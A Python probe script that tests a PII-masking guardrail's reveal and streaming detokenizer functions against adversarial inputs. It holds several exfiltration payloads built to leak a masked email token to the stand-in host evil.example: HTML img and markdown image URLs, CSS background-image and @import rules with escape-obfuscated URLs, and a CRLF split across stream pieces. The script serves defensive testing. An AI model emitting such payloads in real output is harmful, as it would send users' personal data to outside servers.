"""Reviewer check of the r4 static adversarial candidates (08-tam-1a r4, 4aecdbc), backend container.

docker exec -w /app -e PYTHONPATH=/app review08t1a-backend-1 python /tmp/probe08r4adv.py
"""

import asyncio

from ffcore.guardrails import masking

VALUE = "ali@example.test"


async def modes(store, text, pieces=None):
    one, _, _ = await masking.reveal_text(text, store=store, scope="s")
    res = [("one", VALUE in one)]
    for size in (1, 7, 50):
        det = masking.StreamDetokenizer(store, "s")
        out = ""
        for i in range(0, len(text), size):
            out += await det.feed(text[i : i + size])
        out += await det.flush()
        res.append((f"stream{size}", VALUE in out))
    if pieces:
        cr = masking.ContextReveal(store, "s")
        live = "".join([(await cr.data({"text": p}, stream_text=True))["text"] for p in pieces])
        res.append(("live-pieces", VALUE in live))
    return " ".join(f"{k}={'REVEALED' if v else 'kept'}" for k, v in res)


async def main():
    store = masking.MemoryTokenStore()
    t = await store.token_for("s", "EMAIL_ADDRESS:" + VALUE, VALUE)
    cases = {
        "r4-1 quote mismatch in tag": (f'<img alt=a"b src="https://evil.example/?x=>\n{t}">', None),
        "r4-1b quote in attribute name": (f'<img "a src="https://evil.example/?x=>\n{t}">', None),
        "r4-2a md opener before tag": (f'[a]( <img src="https://evil.example/?q=)\n{t}">', None),
        "r4-2b pre + md opener + blank": (f'<pre>[a]( <img src="https://evil.example/?q=\n\n{t}">', None),
        "r4-3 <PII_n tag name": (
            f'<PII_1 style\n="display:block;background-image:&#117;rl(https&#58;&#47;&#47;evil.example/?q={t})">',
            None,
        ),
        "r4-4 style block css escapes": (
            "<style>\nbody{background-image:\\75 rl(\"\\68ttps\\3a\\2f\\2f evil.example/?q="
            + t
            + "\")}\n</style>",
            None,
        ),
        "r4-4b style @import escapes": (
            "<style>\n@import \"\\68ttps\\3a\\2f\\2f evil.example/?q=" + t + "\";\n</style>",
            None,
        ),
        "r4-5 CRLF split over pieces": (
            f"![x](\r\n&#47;&#47;evil.example/?q={t})",
            ["![x](\r", f"\n&#47;&#47;evil.example/?q={t})"],
        ),
        "control: tag line closed then plain": (f"<b>x</b>\nKişi {t} idi.", None),
    }
    for name, (text, pieces) in cases.items():
        print(f"ADV {name}: {await modes(store, text, pieces)}")
    # NOTE-r4-1: fail_closed marks only the first line
    cr = masking.ContextReveal(store, "s")
    cr.fail_closed()
    a = (await cr.data({"text": "abc\n"}, stream_text=True))["text"]
    b = (await cr.data({"text": f'{t}">'}, stream_text=True))["text"]
    print("ADV fail_closed, second line (an HTML value opened before `after`):", "REVEALED" if VALUE in a + b else "kept")


asyncio.run(main())
